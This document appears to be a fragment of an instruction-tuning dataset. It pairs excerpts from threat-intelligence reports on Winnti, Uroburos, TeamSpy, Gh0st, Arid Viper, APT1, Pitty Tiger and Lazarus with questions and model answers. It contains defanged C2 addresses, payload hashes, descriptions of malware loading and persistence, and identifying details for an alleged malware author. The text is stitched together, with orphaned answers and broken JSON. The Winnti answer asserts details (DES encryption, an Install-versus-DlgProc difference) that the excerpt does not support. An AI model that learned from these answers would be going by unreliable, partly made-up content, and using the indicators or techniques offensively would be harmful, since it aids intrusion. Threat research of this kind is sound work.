and version 3.0 variants, the discussion on the Installation Phase 2 sequence will focus on only the version 3.0 service component.\nThe service component has only two functions: activate the installer functionality of the engine component or respond as a service DLL and activate the engine component's malware start-up routines. Both modes of the service component have a common initialization sequence:\n1. DllMain, upon activation, manually loads the engine binary into memory.\n2. The exports from the engine component (Install, DeleteF, and Workman) are loaded into a memory structure.\nThe engine component exists as a data blob within the service component. The executable image of the engine component contains a stripped-down PE/COFF header that is missing several key attributes, such as the MZ and PE magic bytes as well as the CPU architecture identifier. These missing pieces require the service component to manually load the engine component's executable image into memory. This includes allocating the appropriate memory, loading the sections appropriately, applying location fix-ups, and loading the necessary imports. The advantage of going to this much effort from an attacker's perspective is that the engine, which is responsible for loading the worker, never touches the disk, thus depriving analysts of a necessary component for analysis when using file-based artifact collection techniques.\n3. The service component determines if the host binary responsible for the service component is either svchost.exe (if run as a service) or rundll32.dll (if loaded pseudo manually or from the dropper).\n4. If neither host executable is found, the Install function of the engine is activated. Otherwise, the DllMain function returns with a success status.\n5. Within the DlgProc function, the service will verify the non-NULL status of the DeleteF function pointer. If the function pointer is non-NULL, the DeleteF function (of the engine) is called.\n6. The DlgProc function next verifies that the Install function pointer is non-NULL and, if the pointer is indeed non-NULL, calls the engine's Install function after supplying the path of the service executable.\nOnce the service component passes control to the engine component's Install function, the service component becomes little more than a placeholder. The service component will remain active only so long as the Install function is active. The engine component then becomes the active component and will conclude the installation process.\n\nQuestion: How does the Winnti malware's installation process differ between pre-version 3.0 and version 3.0 variants, particularly in terms of the service component?\n\nAnswer:",
    "output": "The Winnti malware's installation process differs significantly between pre-version 3.0 and version 3.0 variants, especially in the service component. Pre-version 3.0 variants use the 'Install' function, while version 3.0 variants use the 'DlgProc' function to activate the service component. Additionally, version 3.0 introduces DES encryption for the service component, adding a layer of complexity to frustrate analysis. The service component in version 3.0 also includes a more sophisticated manual loading process for the engine component, ensuring it never touches the disk, thereby complicating file-based artifact collection for analysts.",

    "output": "The use of multiple public web pages by the Dukes (APT29) indicates a sophisticated approach to evading detection and maintaining persistent access to targeted systems. By spreading their command and control infrastructure across numerous platforms, they reduce the risk of being discovered and shut down. Cybersecurity professionals can apply this knowledge by developing more robust threat intelligence frameworks that track and correlate activities across different web services. Additionally, employing machine learning algorithms to detect patterns indicative of covert communication channels can help in identifying and mitigating similar threats.",

Taiwan's recent election of the pro-independence Democratic People's Party has almost certainly prompted concern in Beijing. Despite the Taiwanese president's pledge to \"maintain the status quo with China,\" Beijing almost certainly views the party's pro-independence mindset as a threat to its territorial sovereignty and future security.  In addition, Japan's increased willingness to defend its regional interests, particularly through expanding the role of its Self-Defense Forces, may allow Japan to balance China more effectively, curbing Beijing's influence and regional ambitions. Lastly, territorial disputes in the South China Sea have intensified over the past few years, due in part to U.S. displays of military power and China's own island-building activities.\nNOVEMBER 23, 2013\nChina establishes an air defense zone near disputed Senkaku/Diaoyu islands in East China Sea.\"17\nDECEMBER 17, 2013\nJapan approves a new security strategy and increases defense spending.

Most\t hackers target indiscriminately\t and instead of persisting\t with\t a particular target draw\t their focus to\t more vulnerable targets.\t APTs on the other hand are not\t only\t well resourced\t and\t capable but persistent\t in their covert\t attempts to access sensitive information, such\t as intellectual property, negotiation strategies or political dynamite,\t from their chosen targets.\nThe sophistication of APT intrusion attempts varies and\t likely\t depends on the attacker's objectives,\t the tools and\t techniques available to them,\t and the anticipated\t ability\t of their target\t both\t to\t detect\t and defend against\t an attack.\t The activity\t conducted by APTs is not\t necessarily\t sophisticated\t but\t the attacker has the ability\t to\t upgrade their sophistication in order to gain or maintain access to\t computer systems of\t interest.\t The level of\t covertness employed\t may depend\t on factors such\t as the anticipated ability of\t the target to detect the\nactivity, the anticipated response of the target\t should\t the targeting be detected,\t the level of risk the hacker is willing\t to\t accept,\t their timeframe to obtain the desired\t information and\t the effects on their longer term\t goals.\nThe term APT is commonly\t used\t in reference to the cyber threat posed\t by foreign intelligence services, or hackers working\t on behalf\t of such\t entities,\t but\t is\t not\t limited\t just\t to\t this and can equally be applied to other threat\t actors such as organised crime syndicates and\t those involved\t in traditional espionage. Even though some organised\t crime syndicates are very\t well resourced\t and\t capable,\t they are not\t usually classed as an APT since they\t are less likely\t to\t persist\t with attempted\t access to a particular target.\t The term is\t not usually\t used\t to\t refer to\t the threat\t posed by an individual hacker as they\t rarely\thave a sufficient\t level of resourcing.\nAPTs often target unpublicised vulnerabilities in computer programs or operating systems using\t 'zero\t day'\t exploits1 .\t Typically\t only\t well\u00adresourced hackers develop such\t exploits as they\t are expensive2 ,\t time\u00adconsuming3 ,\t and the vulnerabilities they\t target may\t be patched prior to\t deployment\t affecting\t the value of the investment.\t In addition, zero\t day\t exploits\t are exposed\t the first\t time they\t are used and, if detected, may be less effective in future attacks.\t As such,\t zero day\t exploits\t are usually\t only\t deployed when the hacker has determined that\t other exploits (that\t take advantage of\t publicly\t known vulnerabilities) will not\t work on the target,\t or are not expected\t to\t work within an acceptable timeframe. Increased\t use of a zero\t day\t exploit\t may\t also\t be observed if the hacker believes their exploit\t has been detected or the vulnerability it exposes has become known. This\t behaviour reflects a desire to\t maximise the return on their investment before the relevant\t vulnerability\t is patched.\t Zero\t day\t exploits are commonly\t used in combination with\t social engineering\t techniques, to\t exploit\t vulnerabilities in human nature and\t make the targeting more effective.\t Social engineering\t techniques are also\noften used to increase the effectiveness of exploits that target known,\t but \tunpatched,\t vulnerabilities.\n1 A 'zero day' exploit is a computer attack capability that takes advantage of a software flaw before it is known to the public or patched by the vendor, that is, before the first day of public awareness of the flaw; on the zeroth day.\n2 On the black market zero day exploits\t can be worth\t hundreds\t of thousands or possibly even millions of dollars. (Moyanhan, 2011)\n3 Developing a zero day exploit can take up to several\t months even from the most expert hackers. (Borders, 2007)\nBig Headline: VICTIM REPORTING\nMany\t of the organisations targeted\t by APTs are likely\t unaware they\t are among\t the victims.\t Those that are aware of attacks against them may\t not publicly\t disclose the fact due to\t concerns about\t their reputation or share price. Public reports of APT attacks date back to\t at\t least\t 1998,\t when the Pentagon, National Aeronautics and Space Administration (NASA), the United States (US) Energy\t Department,\t research\t laboratories and\t private universities were targeted. The past year (2010/2011) has seen an increase in the number of\t organisations coming\t forward, admitting\t they have been targeted. It has also seen an increase in US\t Securities and Exchange Commission filings warning\t shareholders about \tthe risks of\t cyber attack.\nThe majority of companies that have come forward\t and\t admitted they are among the victims have not\t been forthcoming with\t the details.\t This is presumably\t because they\t do not\t want to\t provide the hackers with\t feedback, or cause further embarrassment to their organisation.\t It is unfortunate that\t such potential negative ramifications of\t detailed\t reporting\t are often seen to\t outweigh the community\t benefit of sharing\t lessons learned.\nMedium Headline: September 2008 \u2013 Office of His Holiness the\t Dalai Lama\nA legitimate email was intercepted in transit to\t the Office of\t His Holiness the Dalai\t Lama (OHHDL) and the attachment\t replaced with\t a file containing malicious content. This attack appeared to be part of a concerted effort\t in which\t hackers used\t social engineering\t techniques to\t gain access to\t the OHHDL computer network.

    "output": "APTs often use 'zero-day' exploits, which are computer attack capabilities that take advantage of software flaws before they are known to the public or patched by the vendor. Zero-day exploits are typically developed by well-resourced hackers due to their expense and the time-consuming nature of their development. APTs deploy zero-day exploits when other exploits are unlikely to work on the target or when they need to achieve their objectives within a specific timeframe. The increased use of a zero-day exploit may also occur if the hacker believes their exploit has been detected or the vulnerability it exposes has become known, aiming to maximize the return on their investment before the vulnerability is patched. Zero-day exploits are often combined with social engineering techniques to enhance their effectiveness.",

The following figure shows an example of a network scheme we discovered in 2013:\nThe targeted machine (A) is a machine with access to sensitive data, e.g. a server. The rootkit installed on the system opens a Microsoft named pipe and waits for an incoming connection. This machine can be named \"spied-on node\".\nThe second machine (B) is an office machine with the capability to connect to the Internet. The rootkit is configured to connect to system (A), with the help of the named pipe, and administrate the machine remotely. Finally, machine (B) is able to pass on all data received from machine (A) to the Internet. This machine (B) could be named \"proxy node\".\nThis peer-to-peer design is really efficient, scalable and resilient. In case a \"proxy node\" is not available/detected, the attackers can use another infected one. The advantage for the attackers: even if a security specialist finds one \"spied-on node\", he cannot easily find the \"proxy node\", due to the fact that this node is a passive node. Furthermore, the analyst does not automatically have the command and control URL. In case of incident response, this design is complicated to apprehend and it is hard to contain the infection.\nMedium Headline: Victims and attribution\nDue to the complexity of the Uroburos rootkit, we estimate that it was designed to target government institutions, research institutions or companies dealing with sensitive information as well as similar high-profile targets.\nConcerning the attribution, we found some technical information which allows us to link the Uroburos rootkit to a cyber-attack against the United States of America, carried out in 20084 (<>)and, particularly, to the worm used by the attackers, called Agent.BTZ. During this 2008 campaign, a USB stick was deliberately \"lost\" in the parking lot of the United States Department of Defense. This USB stick contained malicious code and infected the military's network.\nThe following leads make us link what we discovered during our analysis with the cyber-attack carried out in 2008:\n\uf0b1 the usage of the same obfuscation key in Uroburos and Agent.BTZ (1dM3uu4j7Fw4sjnbcwlDqet4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f 5cvd0fk6c1a0s)\n\uf0b1 the usage of the same file name to store logs: winview.ocx\n\uf0b1 Uroburos actually checks whether Agent.BTZ is already present on the attacked system, before its installation. In case Agent.BTZ is installed, Uroburos will not be installed on the system.\n\uf0b1 the usage of Russian language in both codes\nIn an article published by Reuters, in 2011, the journalist mentioned that \"U.S. government strongly suspects that the original attack was crafted by Russian Intelligence.\"5 (<>)We found Uroburos samples with a resource in Russian language:\nIn case someone from the audience of this report notices an infection caused by the Uroburos rootkit and needs help, would like to receive further technical information or would like to contribute any information about this case, please feel free to contact us by email using the following mailbox:\n4 http://en.wikipedia.org/wiki/2008_cyberattack_on_United_States\n5 http://www.reuters.com/article/2011/06/17/us-usa-cybersecurity-worm-idUSTRE75F5TB20110617\nBig Headline: Conclusion\nThe Uroburos rootkit is one of the most advanced rootkits we have ever analyzed. The oldest driver we identified was compiled in 2011, which means that the campaign remained undiscovered for at least three years.\nThe investment to develop a complete framework such as Uroburos is extremely high. The developer team behind the development and the design of such an enhanced framework is really skilled. We believe that, until today, the team behind Uroburos has developed an even more sophisticated framework, which still remains undiscovered.\nThe design is highly professional; the fact the attackers use a driver and a virtual file system in two separate files which can only work in combination, makes the analysis really complicated. One needs to have the two components to correctly analyze the framework. The driver contains all of the necessary functionality and the file system alone simply cannot be decrypted.\nThe network design is extraordinarily efficient, too; for an incident response team, it is always complicated to deal with peer-to-peer infrastructure. It is also hard to handle passive nodes, because one cannot quickly identify the link between the different infected machines.\nThis kind of data stealing software is too expensive to be used as common spyware. We assume that the attackers reserve the Uroburos framework for dedicated and critical targets. This is the main reason why the rootkit was only detected many years after the suspected first infection. Furthermore, we assume that the framework is designed to perform cyber espionage within governments and high profile enterprises but, due to its modularity, it can be easily extended to gain new features and perform further attacks as long as it remains undetected within its target.\nThere are some strong indications which suggest that the group behind Uroburos is the same as the one behind Agent.BTZ, which allegedly was part of an intelligence agency cyberattack targeting US military bases in 2008. Notable hints include the usage of the exact same encryption key then and now, as well as the presence of Russian language in both cases.\n\nWhat specific technical indicators link the Uroburos rootkit to the 2008 cyber-attack against the United States involving Agent.BTZ, and how do these indicators support the attribution?",
    "output": "Several technical indicators link the Uroburos rootkit to the 2008 cyber-attack involving Agent.BTZ. These include the usage of the same obfuscation key in both Uroburos and Agent.BTZ, the usage of the same file name (winview.ocx) to store logs, and the fact that Uroburos checks for the presence of Agent.BTZ on the attacked system before installing itself. Additionally, both codes contain Russian language elements. These indicators support the attribution by providing concrete evidence of shared techniques and tools, suggesting that the group behind Uroburos is likely the same as the one behind Agent.BTZ.",

    "output": "The backdoor employs several techniques to remain undetected and functional. It uses DLL search order hijacking or binary planting by replacing a legitimate DLL ('msacm32.drv') with a malicious version that still loads the legitimate DLL to maintain normal functionality. It also contains Poison Ivy RAT shellcode encrypted with a custom cipher and attempts to communicate with an external C2 server using the Poison Ivy binary protocol. If this fails, it reverts to a secondary backdoor using HTTP GET and POST requests to an internal IP address. To counter these techniques, security measures should include monitoring for unusual DLL loading behavior, checking for unexpected registry changes, and analyzing network traffic for signs of C2 communication. Additionally, implementing strict application whitelisting and network segmentation can help prevent the execution and spread of such malware.",

    "output": "Network Denial of Service (DoS) attacks aim to degrade or block the availability of targeted resources to users by exhausting the network bandwidth services rely on. In the case of the X-Shell RAT used by the APT group, it has the capability to conduct denial of service attacks, which can be leveraged to perform Network DoS attacks. Specifically, the RAT's ability to terminate TCP connections and shutdown or restart the computer can be used to flood a targeted resource with traffic, overwhelming its network bandwidth and rendering it unavailable to users. Furthermore, the RAT's optional feature to enable the compromised computer to be used as part of a botnet to conduct distributed denial of service attacks amplifies the potential impact of the attack. The fact that the X-Shell RAT is VM-aware, proxy-aware, and can use a specified DNS server to resolve callback domains also makes it more challenging to detect and mitigate such attacks. Overall, the X-Shell RAT's capabilities make it a potent tool for conducting Network DoS attacks, highlighting the importance of robust network defenses and mitigation strategies to protect against such threats.",

It collects statistics on malware incidents from around the world. The TeamSpy attacks have been recorded in several countries around the world, with the highest number of incidents being in Russia and Ukraine. Here's a map of infections:\n\"Teamspy\" KSN detections (unique PCs) - March 2013\nIn addition to the KSN reports, we were able to extract a list of victims from two command and control servers' databases. These are available to anyone who knows the URL which serves these lists.\nFor \"bannetwork.org\" we have the following list of registered victims:\nFor \"news-top.org\", we have the following list of victims:\nIn both cases, Russia and Turkey appear as top targets, with other countries such as India, Sweden, Iran or US following.\nIt should be noted that the statistics from the command and control servers include only the victims that were infected with the Teamviewer-based package. The command servers have bigger logs which possibly include many other victims, although the nature of these is impossible to determine because the respective database tables are not handled anymore by the existing scripts.\nFor instance, the C2 at \"bannetwork.org\" has an extended log of supposed victims, spanning for two years, with the earliest entry from 23 Sep 2011 and the latest from March 2013.\nNumber of unique victims per month handled by the bannetwork.org C2\nA peak can be observed on Jan 2012 - when the attackers infected a large amount of victims, 323.\nIn regards of victim's profiles, in general, the IPs do not appear to hold useful information. Some do belong to specific networks, however, it's unclear if they are researchers or true victims. A top of the ISPs for the victims at \"bannetwork.org\" include:\nBig Headline: Links with \"countlist.org\" and Alexander Sokolov\nWe were able to identify several older samples which connect to the command and control domain \"countlist.org\".

The attacks (see , story in Russian) were using a number of .RU domains as command and control, namely \"kosmoaministrator.ru\", \"adminplagin.ru\" and \"korakura.ru\". These domains are now sinkholed by Kaspersky Lab.\nIn addition to these attacks, we discovered a number of other command and control servers used by attackers which employ the Teamviewer-based attack toolkit.\nBased on our research, it seems the Teamviewer based trojans appeared in the Russian underground forums a couple of time ago and were readily available for purchase by interested parties.\nAt the moment, it is unclear if there is a connection between all these attackers (such as the ones from the charter97.org story) and the \"TeamSpy Crew\". The TeamSpy Crew differentiates itself by mostly using \".org\" domains for command and control. On these command and control servers, they maintain a specific infrastructure and directory structure, for instance, serving the malicious \"TeamViewer.ico\" installer.\nBig Headline: Conclusions\nAccording to existing information, the TeamSpy crew has been active at least since 2008, possibly going back to as early as 2004 if we are to believe the domain registration dates and consider the news aggregation channels. During the years, the team has been focusing on attacking a variety of targets, ranging from activists and political to heavy industry and national information agencies.\nSome of the aspects of this operation, such as keywords and usage of Russian terms remind us of Red October, although there are no direct links at the moment. If we are to compare it to Red October, the TeamSpy Crew and the tools they use are far less sophisticated and professional.\nTo attack their targets, the TeamSpy crew relied on a variety of custom tools, designed to collect \"special\" and interesting documents, such as those containing the word \"secret\" in their names. The special name \"saidumlo\" (Georgian - \"secret\") probably indicates at least some of the victims were in Georgia or from Georgia.\nThe most recent method used by the TeamSpy crew involved the using of Teamviewer, a legal  remote administration tool. Since Teamviewer is normally used in a wide range of conditions, it is not normally detected by security software with default settings. In addition, the modules are validated with digital signatures, once again, making them \"trustworthy\" to a range of whitelisting software.\nUnlike Red October, where many IPs could be traced to Governments and Governmental institutions based on WHOIS data, in this case, the vast majority of IPs belong to ISPs which do not advertise such information. In case of TeamSpy crew, except for a very few cases, the identity of the victims remains a mystery.\nMedium Headline: C2 related information:\nbannetwork.org:\nCreated On:02-Sep-2004 10:20:14 UTC\nOnlineNIC Inc.

Just as with other well-featured \"off-the-shelf\" trojans like Poison Ivy, Hupigon and DarkComet it has been used by all sorts of people \u2013 from the script kiddie next door to resourceful targeted attack actors (1)\nCybercriminals use off-the-shelf malware not only because it's easy and cheap. They also use it because it's hard to track. Anybody could use this malware, so the criminal could be anybody. However, this changes somewhat when they start modifying the code. The malware now becomes somewhat attributable and can be connected to known cases and criminal groups.  This document is the result of examining selected common traits between some 1200+ Gh0st Rat program files (samples) with the help of Maltego, a tool to visualize data connections. The samples were processed by us in a timeframe of approximately six months, from August 2011 to February 2012.\nIn this study we attempt to map out what logical connections do exist between different Gh0st botnet campaigns.

When criminals modify the code, the malware becomes attributable and can be linked to specific cases and criminal groups. This is because the modifications introduce unique characteristics that can be analyzed and connected to previous incidents. Cybercriminals might choose to modify such malware despite the potential risks because it allows them to customize the functionality to better suit their specific needs and evade detection by traditional security measures.

We believe they belong to the same person though we have yet to find a real person behind the profiles.\nSmall Headline: Dev_hima\nAs previously mentioned, several advtravel.info infection logs can be clearly linked to Operation Advtravel's malware developers or bot masters. It is also worth remembering that the malware used in Operations Advtravel and Operation Arid Viper distinctly differed from each other though they shared a common network infrastructure. The logs showed that the infection started from the same folder Visual Studio\u00ae drops a compiled file into and that screenshots showed other malware present on advtravel.info. This shows that advtravel.info is a development environment and could very likely be where the malware are programmed. The server's username is Dev_hima. A close look at other log files allowed us to find at least three other systems with the same user. Some of the samples gathered from the Trend Micro sample database listed down Dev_hima as an internal author as well.\nThe bot logs from Dev_hima look like logs from test environments with different virtual machines that belonged to the original developer who performed some debugging and testing. This mistake went even further, as while testing the malware, it took several screenshots of Dev_hima's system, which gave us some insight into his operations. The CPanel display in a Windows 8 environment showed how he went through victim logs. Other tabs open in the same browser display his Facebook profile page.\nThe control panel is a Windows tool called \"DHSDM.\" Its icon can also be seen as the rightmost program on the taskbar. This can be found on several of Dev_hima's test virtual machines. It also showed that Dev_ hima corresponded to the Admin user of the control panel. Other details recovered from logs revealed an IP address geolocated in Cairo, Egypt.\nAnother clue to Dev_hima's relation to the Advtravel malware was a working downloader from December 2014 that is related to advtravel. info. It downloaded a malware from a server that is then run on infected systems. The PE header data of this downloader again showed the name, Dev_hima as application publisher. Nveron appears to be Dev_ hima's filename for the malware.\nScreenshot of Dev_hima's system stored on advtravel.info\nInformation on a malware variant published by Dev_hima\nA web search for developers with the nickname, Dev_hima, turned up one profile that fit what we know so far very well. Dev_hima was not exactly hiding online. He actually had various online accounts\u2014http://devhima.blogspot.com/p/blog-page.html, http:// devhima.webs.com/about, youtube.com/user/ibrahhm2121/, facebook.com/devhima, twitter.com/dev_hima, linkedin.com/pub/ebrahim-elsharawy/69/324/7b5, scribd.com/ devhima, soundcloud.com/ebrahim-elsharawy, and devhima.tumblr.com\u2014that tie his real identity to his nickname.\nDev_hima can also be tied to the Skype ID, ibrahhm2121, along with the email addresses, dev_ hima@yahoo.com, devhima@ hotmail.com, ibrahhm2121@ gmail.com, ibrahhm212@gmail. com, and ibrahhm2121@yahoo. com. Of course, it is conceivable that a malicious hacker sought to appropriate El Sharawy's identity or coincidentally chose the same nickname.\nSome of Dev_hima's social networking profiles\nA look at malicious activities tied to the nickname, Dev_hima, revealed very interesting things. We found that Dev_hima was part of the \"Gaza Hacker Team,\" a group involved in multiple website hacking and defacement incidents against Israeli targets in the past. A few of the more than 2,000 defacement attacks the team carried out involved sites in Israel.\nDev_hima also has ties to several email addresses and online accounts\nSome of Dev_hima's hacker group profiles can also be found on gaza-hacker.org/cc/member-u_42271. html and arabteam2000-forum.com/ index.php/user/272853-dev-hima/. His personal project page\u2014http:// devhima.webs.com/\u2014showed several potentially malicious tools that he has coded. DevPcTwitter, for instance, allows attackers to control a target system using a Twitter account. DevSpy, meanwhile, allows parents to monitor their children's online communication and browsing habits for protection purposes. In reality though, DevSpy is simply a piece of spyware.\nDevPcTwitter (MD5: bfcb492d282960152a366b5760b87920d02c6e83) is publicly available for download on Dev_hima's site.\nThe structure of the last four DevPcTwitter commands\u2014getfile*[file_path]\u2014is interesting. The commands had a similar though not identical syntax to the format Dev_hima's bot used to communicate with advtravel.info.\nDev_hima shared tutorial videos on YouTube on how to configure and use DevPcTwitter. These videos were linked to his personal page. His Twitter bot's function is simple. It lets a user register a Twitter account and an email address in the\nList of website attacks that Dev_hima's hacker group was involved with\nDevPcTwitter program. The user can then start tweeting commands via the account registered, which the bot reads and executes. Commands such as GetScreenShot tells DevPcTwitter to take screenshots of a victim's desktop that it then emails to the email address registered. The bot can also download and execute files using the Download$[URL] command.\nDevPcTwitter's UI shows it was designed for Arabic-speaking users.\nDevPcTwitter is low-risk because it requires a lot of user interaction to set up and operate. Its bot does not have the functionality to stealthily run in the background as well.\nDev_hima also developed the spying tool, DevSpy. Its installer (MD5:\nTools available for public download on Dev_hima's website\nd325c541fa0f3080a25394fe3a586100910f5569)\nis also available for public download from http:// devhima.webs.com/. Unlike DevPcTwitter, the DevSpy interface uses English, not Arabic. Its setup is also pretty self-explanatory. It takes desktop screenshots at user-specified intervals that it then stores in a folder. It can stealthily run in the background. In stealth mode though, it can be only be accessed by pressing a hotkey that requires password authentication. In the same mode, DevSpy can remove itself from a victim's Windows Task Manager process list.\nDevSpy is medium- to high-risk because it is designed to spy on users in stealth mode. It is possible or even likely that the malware used to communicate with advtravel.info is a privately enhanced version of Dev_hima's tools.\n\nQ: How did the email addresses mahmoud.hashem12@gmail.com and moh.s009@gmail.com tie together the two campaigns, Operation Arid Viper and Advtravel? Explain the significance of this connection.",
    "output": "A: The email addresses mahmoud.hashem12@gmail.com and moh.s009@gmail.com were used to register multiple C&C servers related to both Operation Arid Viper and Advtravel. Specifically, mahmoud.hashem12@gmail.com was used to register mediahitech.info and ahmedfaiez.info for Operation Arid Viper, and fpupdate.info for Advtravel. Similarly, moh.s009@gmail.com was used to register ahmedfaiez.info, fpupdate.info, and several other domains for both campaigns. This overlap in email usage indicates a shared network infrastructure and suggests that the same individual or group might be behind both campaigns, despite the use of different malware binaries.",

This section provides photos and details of Unit 61398 facilities, Chinese references discussing the unit's training and coursework requirements, and internal Chinese communications documenting the nature of the unit's relationship with at least one state-owned enterprise. These details will be particularly relevant when we discuss APT1's expertise, personnel, location, and infrastructure, which parallel those of Unit 61398.\nMedium Headline: The Communist Party of China\nThe PLA's cyber command is fully institutionalized within the CPC and able to draw upon the resources of China's state-owned enterprises to support its operations. The CPC is the ultimate authority in Mainland China; unlike in Western societies, in which political parties are subordinate to the government, the military and government in China are subordinate to the CPC. In fact, the PLA reports directly to the CPC's Central Military Commission (CMC, \u4e2d\u592e\u519b\u4e8b\u59d4\u5458\u4f1a).6 This means that any enterprise cyber espionage campaign within the PLA is occurring at the direction of senior members of the CPC.\nWe believe that the PLA's strategic cyber command is situated in the PLA's General Staff Department (GSD,\u603b\u53c2\u8c0b\u90e8), specifically its 3rd Department (\u603b\u53c2\u4e09\u90e8).7 The GSD is the most senior PLA department. Similar to the U.S. Joint Chiefs of Staff, the GSD establishes doctrine and provides operational guidance for the PLA. Within the GSD, the 3rd Department has a combined focus on signals intelligence, foreign language proficiency, and defense information\nsystems.8 It is estimated to have 130,0009 personnel divided between 12 bureaus (\u5c40), three research institutes, and 16 regional and functional bureaus.10 We believe that the GSD 3rd Department, 2nd Bureau (\u603b\u53c2\u4e09\u90e8\u4e8c\u5c40), is the APT group that we are tracking as APT1. (<>)Figure 1 shows how close the 2nd Bureau sits to the highest levels of the CPC. At this level, the 2nd Bureau also sits atop a large-scale organization of subordinate offices.\n6 James C.

Military Unit Cover Designators are also used in official publications and on the Internet to refer to the unit in question.

Blasko\nSmall Headline: Identifying GsD 3rd Department, 2nd Bureau as unit 61398\nThe care with which the PLA maintains the separation between the GSD 3rd Department, 2nd Bureau, and the MUCD 61398 can be partially observed by searching the Internet for official documents from the Chinese government that refer to both the 2nd Bureau and Unit 61398. Figure 2 shows the results of one of these queries.\nFIGure 2: no results found for searching for \"GsD 3rd Department 2nd Bureau\" and \"unit 61398\" on any Chinese government websites\nDespite our challenges finding a link between the Chinese Government and Unit 61398 online, our searches did find references online indicating that the GSD 3rd Department, 2nd Bureau, is actually Unit 61398.

Our specific sample uses \"ssss0\" instead of the usual \"Gh0st\" header for network communications.\nSmall Headline: Command & Control\nThe commands ID used in the communication protocol have also changed, but the features are quite the same.\nThe configuration is directly embedded in the binary, and deciphered at runtime. Up to 5 c&c servers can be configured, but our sample only had one: \"ey.avstore.com.tw:53\".\n\"EY\" could stand for \"Ernst & Young\". It would not be very surprising, since a lot of different attack groups do use anti-virus vendors or other big company's names to try to look more legitimate. Pitty Tiger is no exception, as detailed later in this report.\nWe also found two c&c binaries, claiming to be versions 2.1 and 2.2 of the Paladin RAT controller. Version 2.1 answers to the \"ssss0\" header, while version 2.2 uses the classical \"Gh0st\" header.\nBig Headline: INFRASTRUCTURE\nOur investigation has focused on three particular c&c servers used by the group. These c&c servers, unlike the other c&cs used by the group, have been misconfigured. Once parsed and dumped, it provided us with more insight.\nWe found several domains used by the Pitty Tiger group, the most interesting ones being detailed in this chapter.\nPitty Tiger, like other APT attackers, often use anti-virus \"familiar names\" when registering domains or creating subdomains. Some examples can be avstore.com.tw, sophos.skypetm.com.tw, symantecs.com.tw, trendmicro.org.tw etc.\nBig Headline: VICTIMS\nMapping the victims of such a targeted campaign is not an easy task.\nWe have found the Pitty Tiger group to be very active against one particular private company from the defense industry and one academic network of a government, , yet we think it was done to be used as a proxy for some of the group's operations.\nWe have also found some connections from other companies to the c&c servers, yet we did not find evidence that they were real victims.\nThese alleged victims do work in different sectors and are located mostly in European countries.\n\uf0b7 1 company from the defense industry;\n\uf0b7 1 company from the energy industry;\n\uf0b7 1 company from the telecommunications industry;\n\uf0b7 1 company specialized in web development.\nIt might be surprising to see a company specialized in web development here, yet it has built websites for interesting potential targets. We suspect Pitty Tiger to use this compromise to spear phish other companies which are in commercial relation with this web development company.\nWe have to mention that we only had access to three of the several attackers' servers. Therefore, we suppose the Pitty Tiger group could have more targets than what we could confirm.\nWe also found a lot of vulnerability scanners launched by the attackers at different targets, yet there was no sign of compromise.\nDuring the course of our investigations, we discovered a RAR archive on the attacker's server containing 5 Word documents and one small C source code. These documents belong to the defense company which has been compromised. According to the name of the files and the general feel of the archive, we do think it was extracted by the attackers to \"show\" someone what kind of data they could get from the compromise of that particular target. The documents were still exhibiting comments from various users, showing it was an ongoing work and not old documents.\nInterestingly enough, we saw a part of these documents appear on Virus-Total, with an additional \"gift\" from the attackers, a payload dropping a malware.\nThere are only two options we can think of here:\n\uf0b7 Someone from the same company has been targeted with this document.\n\uf0b7 Someone from another company has been targeted with this document. This other company could be a partner or competitor.\nSince we were unable to determine the intended use of this specific document, we can only suppose that it could be used to provide commercial advantages to competitors of that company, or used by a foreign state.\nMedium Headline: ATTACKER'S CONNECTIONS TO THE C&C\nWe have been able to get all the RDP connections logs to one c&c server:\nRDP connections from attackers machines to one particular c&c, from beginning of April 2014 to beginning of July 2014\nThese connections are either VPS or dynamic IP addresses, mostly from China.\nA computer named CHMXY-PC connected to the c&c via RDP with IP address 58.61.40.5.

    "instruction": "Big Headline: Other Known Operations\nThe attack on European financial institutions was implemented via a watering hole, a compromised government website that had many regular visitors from local banks. However, the same approach has been used in multiple other places around the world. The Polish waterhole incident got much more public attention than the others due to the escalation of the alert to a higher level and the compromise of a government website.\nWe have seen a few other websites being compromised with the same symptoms and turned into a watering hole through script injection or by placing exploit delivery code. We have found them in the following countries:\n\u25cf Russian Federation\n\u25cf Australia\n\u25cf Uruguay\n\u25cf Mexico\n\u25cf India\n\u25cf Nigeria\n\u25cf Peru\nWhat connected most of the compromised websites was the JBoss application server platform. This suggests that attackers may have an exploit for the JBoss server. Unfortunately we haven't managed to find the exploit code yet. Nevertheless, we would like to recommend to all JBoss application server administrators that they limit unnecessary access to their servers and check the access logs for attack attempts.\nBanks were not the only Lazarus Group targets. This suggests that it has multiple objectives. We have seen some unusual victims, probably overlapping with the wider Lazarus Group operations, i.e. a cryptocurrency business. When it comes to Bluenoroff, its typical list of targets includes banks, financial and trading companies, casinos and cryptocurrency businesses.\nDetections of Lazarus/Bluenoroff malware are also distributed across the world.

So far we have detected three separate campaigns, although we're unsure of the starting point for each of these incidents but are highly confident they exist in this cluster of activity.\nLink 1: hxxp://ceengrmes.attachment[.]biz/?att=1450603943\nPayload: 07defabf004c891ae836de91260e6c82, MSIL/Crimson\nPayload name: Accn Letter.scr\nC&C: 5.189.143[.]225:11114\nLink 2: hxxp://fileshare.attachment[.]biz/?att=1455264091\nPayload: 18711f1db99f6a6f73f8ab64f563accc,XLS VBS-downloader *\nPayload name: Air India Valid Destinations.xls\n*Same payload as delivered by hxxp://fileshare[.]attachment[.]biz/?att=1455255900 from the attacker's cdrfox.xyz site\nLink 3: hxxp://comdtoscc.attachment[.]biz/?att=1453788170\nPayload: 45d3130a901b7a763bf8f24a908b1810,compressed archive\nPayload name: Message.zip\nDecompressed Payload: 765f0556ed4db467291d48e7d3c24b3b, MSIL/Crimson\nDecompressed payload name: Message.scr\nC&C: 193.37.152[.]28:9990\nSmall Headline: AFOWOBLOG.IN Domain\nWe have uncovered circumstantial evidence indicating that the afowoblog.in domain falls into this cluster of activity. The domain was registered on or near February 24th, 2016 using the email address thefriendsmedia@gmail.com, which is also close to the same day that the \"AFOWO Broucher 2016.xls\" attachment was uploaded to VT. We have detected potentially connected activity as far back as June 2013 using the domain thefriendsmedia[.]com , where it was used as an Andromeda C&C.\nIn one instance (Fig. 22, maltego graph), we observed an Andromeda payload communicate with brooksidebiblefellowship[.]org to retrieve an additional Andromeda payload from lolxone[.]com that then used thefriendsmedia[.]com as its C&C. The original Andromeda also retrieved a Bezigate payload.\nFurthermore, we have observed lolxone[.]com hosting additional Bezigate 